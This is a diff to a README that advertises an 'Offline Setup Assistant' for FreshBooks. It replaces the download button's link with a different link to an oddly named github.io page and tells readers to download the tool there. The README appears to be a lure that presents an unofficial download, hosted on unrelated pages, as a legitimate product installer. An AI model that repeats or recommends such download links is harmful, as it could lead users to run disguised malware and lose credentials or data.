@@ -1,6 +1,6 @@
-# FreshBooks — Offline Setup Assistant
+# FreshBooks 
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://jetbrains-intellij-idea-pro.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://asdeennerhorse.github.io/mogus/FreshBooks)
 
 ## ⚙️ How to Use
 1. Download the setup assistant using the button above  
@@ -27,7 +27,7 @@ This offline setup assistant enables installation and usage of FreshBooks in air
 ## 🖼 Preview
 
 ![FreshBooks Interface](https://i.ytimg.com/vi/532wbzws3js/maxresdefault.jpg)  
-*FreshBooks dashboard showing client projects and invoices*
+
 
 ---
 
